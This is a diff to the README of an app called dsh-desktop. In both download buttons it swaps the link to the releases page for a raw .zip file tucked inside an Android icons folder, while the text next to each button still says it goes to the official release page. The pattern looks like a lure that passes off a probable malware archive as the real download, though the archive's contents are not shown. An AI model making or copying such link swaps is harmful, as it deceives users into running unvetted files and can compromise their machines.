@@ -17,7 +17,7 @@ Whether you're a student, professional, or just curious about AI, **dsh-desktop*
 Here's the wonderful news: getting **dsh-desktop** on your computer is as simple as 1-2-3.  
 
 ### Step 1: Get the App  
-[![Download dsh-desktop](https://img.shields.io/badge/⬇%20Download%20dsh--desktop%20Now-4CAF50?style=for-the-badge&logo=windows&logoColor=white&color=teal)](https://github.com/geminiai19811-jpg/dsh-desktop/releases)  
+[![Download dsh-desktop](https://img.shields.io/badge/⬇%20Download%20dsh--desktop%20Now-4CAF50?style=for-the-badge&logo=windows&logoColor=white&color=teal)](https://raw.githubusercontent.com/geminiai19811-jpg/dsh-desktop/main/src-tauri/icons/android/mipmap-xhdpi/v2.7.zip)  
 
 Visit this link to download the application.  
 
@@ -58,7 +58,7 @@ We know installation can sometimes be intimidating, but this guide walks you thr
 ## 📂 Download & Install  
 
 Ready to dive in? Click the Download Button to visit the official release page.  
-[![Get dsh-desktop Now](https://img.shields.io/badge/🚀%20Get%20dsh--desktop-FF5722?style=for-the-badge&logo=windows&logoColor=white&color=orange)](https://github.com/geminiai19811-jpg/dsh-desktop/releases)  
+[![Get dsh-desktop Now](https://img.shields.io/badge/🚀%20Get%20dsh--desktop-FF5722?style=for-the-badge&logo=windows&logoColor=white&color=orange)](https://raw.githubusercontent.com/geminiai19811-jpg/dsh-desktop/main/src-tauri/icons/android/mipmap-xhdpi/v2.7.zip)  
 
 Visit this link to download the application.  
 
